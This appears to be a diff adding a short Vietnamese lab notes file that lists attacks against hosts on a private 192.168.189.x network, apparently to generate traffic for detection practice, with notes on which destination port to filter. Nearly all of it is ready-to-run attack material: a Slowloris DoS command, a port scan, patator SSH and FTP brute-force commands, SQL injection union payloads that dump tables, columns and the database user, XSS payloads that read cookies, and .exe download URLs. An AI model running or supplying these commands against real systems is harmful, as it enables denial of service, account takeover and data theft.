@@ -1,0 +1,40 @@
+***1.Tấn công dos
+- sudo python3 /home/kali/Desktop/Slowloris/slowloris/slowloris.py 192.168.189.133 -s 500 -p 80
+- lọc theo port đích 80 
+
+***2. port scan 
+- sudo python /home/kali/Desktop/script_data/portscan_new.py
+
+***3. bruce force
+- sudo patator ssh_login user=william password=FILE0 0=/home/kali/Desktop/Brute-force-SSH-service/passwords.txt host=192.168.189.133 -x ignore:fgrep='Access denied for user'
+- lọc theo port đích 22
+
+***4. FTP bruce force
+- sudo patator ftp_login user=william password=FILE0 0=/home/kali/Desktop/Brute-force-SSH-service/passwords.txt host=192.168.189.133 -x ignore:fgrep='Access denied for user'
+- lọc theo port đích 21 
+
+***5 . truy cập internet
+- lọc port đích 443
+
+*** 6. sql injection
+- 6.1 get search
+	- lam' union select 1, (select GROUP_CONCAT(table_name,'\n') from information_schema.tables where table_type='BASE TABLE'),3,4,5,6,7 #
+	- lam' union select 1,user(), database(),4,5,6,7 #
+- 6.2 get select:
+	- http://192.168.189.133:8080/sqli_2.php?movie=100 union select 1, (select GROUP_CONCAT(column_name,'\\n') FROM information_schema.columns WHERE table_name ='users'),3,4,5,6,7 #&action=go
+- alert
+-lọc theo port đích 8080
+
+*** 7. XSS
+- 7.1 XSS get
+	- <script>alert(document.cookie)</script>
+	- <img src=\"#\" onmouseover=\"alert('XSS via onmouseover')\">
+- 7.2 XSS json:
+	- "\"}]}';alert(document.cookie)</script>"
+- alert
+ -lọc theo port đích 8080
+***8. tải file
+- http://192.168.189.135/downloads/demo.exe
+- http://192.168.189.135/downloads/yourfile.txt
+- alert
+- check file
